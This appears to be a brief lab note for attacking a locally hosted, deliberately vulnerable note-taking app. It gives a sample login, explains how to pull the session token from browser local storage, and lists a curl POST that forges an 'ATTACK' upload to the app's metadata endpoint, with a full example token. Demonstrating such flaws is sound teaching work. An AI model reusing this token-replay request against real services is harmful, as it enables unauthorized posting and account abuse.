vulnerable site attack steps:
1. OPEN inspect
2. LOGIN: for example - byle 03061997
3. COPY token from console
    (OR from: F12 -> Application -> local storage -> http://localhost:3000 -> KEY: loggedNoteappUser)
4. OPEN cmd
5. PASTE the command and COMPLETE the missing parts:
    curl -X POST -H "Authorization: Bearer {YOUR_TOKEN}" -F "username={YOUR_USERNAME}" -F "title=ATTACK" -F "content=you are under attack" -F "video=" -F "date=2023-07-29" http://localhost:3001/api/uploadMetaData
    *for example:* 
    curl -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJ5bGUiLCJpZCI6IjY0YzRlYjNjMTc2M2EzM2IzMjI1MjNkMyIsImlhdCI6MTY5MDcyNjg2MX0.wm-3zK8gZWtlMbKPnjC1isM5AgVMAY027ukxp_puLaw" -F "username=byle" -F "title=ATTACK" -F "content=example attack" -F "video=" -F "date=2023-07-29" http://localhost:3001/api/uploadMetaData